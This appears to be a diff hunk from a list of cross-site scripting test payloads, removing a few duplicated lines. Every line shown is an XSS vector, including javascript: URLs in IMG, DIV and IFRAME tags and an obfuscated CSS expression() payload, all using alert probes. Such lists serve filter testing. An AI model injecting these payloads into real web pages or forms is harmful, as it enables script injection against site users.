@@ -18,11 +18,6 @@ exp/*<A STYLE='no\xss:noxss("*//*");xss:&#101;x&#x2F;*XSS*//*/*/pression(alert("
 <IMG SRC=" &#14;  javascript:alert('XSS');">
 <DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">
 <IMG SRC=" &#14;  javascript:alert('XSS');">
-http://66.102.7.147/">XSS
-"><h1><IFRAME SRC="javascript:alert('XSS');"></IFRAME>">123</h1>
-"><h1><IFRAME SRC="javascript:alert('XSS');"></IFRAME>">123</h1
-<IMG SRC=" &#14;  javascript:alert('XSS');">
-<DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">
 
 
 
